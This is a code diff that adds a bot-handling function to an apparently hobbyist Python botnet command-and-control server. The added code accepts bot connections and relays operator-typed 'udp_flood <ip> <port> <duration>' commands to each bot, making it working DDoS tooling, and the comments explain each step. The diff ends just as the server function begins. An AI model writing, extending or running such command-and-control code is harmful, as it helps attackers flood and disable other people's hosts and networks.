@@ -1,6 +1,33 @@
 import socket
 import threading
 
+# Sockets library will allow us to handle low-level network communication. This is used to create THE server socket,
+# and accept connections and send/receive data connection == TCP, whereas udp_flood is using UDP sockets.
+
+# Threading same thing as always, used to handle bots on seperate threads
+
+# Function to handle communication with a single bot
+def handle_bot(conn, addr): # conn: connected obj (the bot), and its ip address
+    print(f"Bot connected from: {addr}")  # Log the bot's ip address to show succesful connection.
+
+    while True:  # infinite loop till bot throw exception like termination.
+        try:
+            # Prompt the control server user to enter a command for the bot
+            command = input("Enter Udp_flood params: (udp_flood <ip> <port> <duration>): ")
+            conn.sendall(command.encode())
+            # Sends command to each bot and encodes command into bytes during transmision.
+
+            # If the command is "exit", terminate the connection with the bot
+            if command.lower() == "exit":
+                print("Shutting down connection with bot...")
+                break
+
+        # If an exception happens we're breaking out of the while loop.
+        except Exception as e:
+            print(f"ERROR!: {e}") # Displays the error for debugging purposes
+            break
+    conn.close()  # Terminate the connection after exiting the loop
+
 
 # Runs the command-control server
 def server(): #  Passive socket (passive endpoint)
